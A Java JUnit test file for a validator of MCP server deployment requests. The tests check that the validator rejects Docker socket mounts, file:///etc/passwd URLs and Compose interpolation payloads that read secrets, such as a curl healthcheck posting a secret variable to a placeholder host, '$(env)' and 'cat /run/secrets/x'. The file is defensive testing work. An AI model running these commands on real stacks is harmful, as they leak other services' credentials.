package io.hermes.missioncontrol.mcp;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

import java.util.List;
import org.junit.jupiter.api.Test;

class McpRequestValidatorTest {

  @Test
  void validatesAndNormalizesManagedInput() {
    var value = McpRequestValidator.validate(new McpServerRequest(
        " Demo ", " description ", "MANAGED", "dh-local", "HTTP", null,
        "example/server:latest", "linux/arm64", List.of("node"), List.of("server.js"),
        null, List.of(), 1100, null, null, null,
        List.of(new ConfigValueInput("TOKEN", "value", true, false)), List.of(),
        List.of(new VolumeSpec("data", "/data")), null, List.of()));

    assertEquals("Demo", value.name());
    assertEquals("managed", value.kind());
    assertEquals("http", value.transport());
    assertEquals("/mcp", value.path());
  }

  @Test
  void rejectsUnsafeDeploymentShapes() {
    McpServerRequest bindLikeVolume = managed(List.of(new VolumeSpec("data", "/var/run/docker.sock")));
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(bindLikeVolume));

    McpServerRequest newlineCommand = new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/server:latest", null,
        List.of(), List.of("hello\nworld"), null, List.of(), 1100, null, "/mcp", null,
        List.of(), List.of(), List.of(), null, List.of());
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(newlineCommand));
  }

  @Test
  void externalAllowsHeadersButRejectsEnvironmentAndRedirectSchemes() {
    McpServerRequest withEnvironment = new McpServerRequest(
        "Remote", null, "external", null, "sse", "https://example.test/sse", null, null,
        List.of(), List.of(), null, List.of(), null, null, null, null,
        List.of(new ConfigValueInput("TOKEN", "x", true, false)), List.of(), List.of(), null, List.of());
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(withEnvironment));

    McpServerRequest fileUrl = new McpServerRequest(
        "Remote", null, "external", null, "http", "file:///etc/passwd", null, null,
        List.of(), List.of(), null, List.of(), null, null, null, null,
        List.of(), List.of(), List.of(), null, List.of());
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(fileUrl));
  }

  @Test
  void stdioUsesExecutableAndArgsNotManagedCommand() {
    var value = McpRequestValidator.validate(new McpServerRequest(
        "Local tool", null, "stdio", null, null, null, null, null,
        List.of(), List.of(), "npx", List.of("-y", "@example/mcp"), null, null,
        null, null, List.of(new ConfigValueInput("TOKEN", "x", true, false)),
        List.of(), List.of(), null, List.of()));
    assertEquals("stdio", value.transport());
    assertEquals("npx", value.stdioCommand());
    assertEquals(List.of("-y", "@example/mcp"), value.args());
  }

  // --- Compose interpolation ----------------------------------------------------------
  //
  // entrypoint, command and healthcheck.test are written literally into the generated
  // Compose file, and Compose interpolates ${VAR} in the values it parses — YAML single
  // quotes do not stop it. The Compose process environment holds the decrypted secrets of
  // every managed server in the stack, keyed by SHA-256(serverId, serviceKey, key), and
  // all three inputs appear in this server's own API response. So a '$' in one of these
  // fields lets a server read another server's credentials and echo them to its own log.

  @Test
  void aComposeInterpolationSequenceIsRejectedInCommandAndEntrypoint() {
    McpServerRequest inCommand = managedWith(
        List.of(), List.of("sh", "-c", "echo ${MC_MCP_00112233445566778899}"), null);
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(inCommand));

    McpServerRequest inEntrypoint = managedWith(List.of("/bin/sh", "-c", "$(env)"), List.of(), null);
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(inEntrypoint));
  }

  @Test
  void aComposeInterpolationSequenceIsRejectedInAHealthcheckTest() {
    McpServerRequest interpolated = managedWith(List.of(), List.of(),
        new HealthcheckSpec(List.of("CMD-SHELL", "curl -d \"${MC_MCP_00112233445566778899}\" x://y"),
            "5s", "3s", 3, "1s"));
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(interpolated));

    McpServerRequest substitution = managedWith(List.of(), List.of(),
        new HealthcheckSpec(List.of("CMD-SHELL", "echo $(cat /run/secrets/x)"), "5s", "3s", 3, "1s"));
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(substitution));
  }

  @Test
  void aComposeInterpolationSequenceIsRejectedInASupportServiceCommand() {
    // support services share the stack, and therefore the same process environment
    McpServerRequest request = new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/server:latest", null,
        List.of(), List.of(), null, List.of(), 1100, null, "/mcp", null,
        List.of(), List.of(), List.of(), null,
        List.of(new SupportServiceRequest("db", "postgres:17", null,
            List.of(), List.of("sh", "-c", "echo ${MC_MCP_00112233445566778899}"),
            List.of(), List.of(), null)));
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(request));
  }

  @Test
  void aDollarSignIsStillAcceptedInAConfigurationValueBecauseSecretsContainThem() {
    // the guard against over-fixing: configuration values never appear literally in the
    // file, only as a ${MC_MCP_…:-} reference, so they cannot interpolate — and rejecting
    // '$' here would refuse perfectly good passwords
    var value = McpRequestValidator.validate(new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/server:latest", null,
        List.of(), List.of("server.js"), null, List.of(), 1100, null, "/mcp", null,
        List.of(new ConfigValueInput("PASSWORD", "p$$w0rd${x}", true, false)), List.of(),
        List.of(), null, List.of()));

    assertEquals("p$$w0rd${x}", value.environment().getFirst().value());
  }

  @Test
  void aDollarSignInAnImageReferenceWasAlreadyRejected() {
    // regression pin: the image pattern excludes '$', '{' and '}' already
    McpServerRequest request = new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/${MC_MCP_x}", null,
        List.of(), List.of(), null, List.of(), 1100, null, "/mcp", null,
        List.of(), List.of(), List.of(), null, List.of());
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(request));
  }

  private static McpServerRequest managed(List<VolumeSpec> volumes) {
    return new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/server:latest", null,
        List.of(), List.of(), null, List.of(), 1100, null, "/mcp", null,
        List.of(), List.of(), volumes, null, List.of());
  }

  private static McpServerRequest managedWith(
      List<String> entrypoint, List<String> command, HealthcheckSpec healthcheck) {
    return new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/server:latest", null,
        entrypoint, command, null, List.of(), 1100, null, "/mcp", null,
        List.of(), List.of(), List.of(), healthcheck, List.of());
  }
}
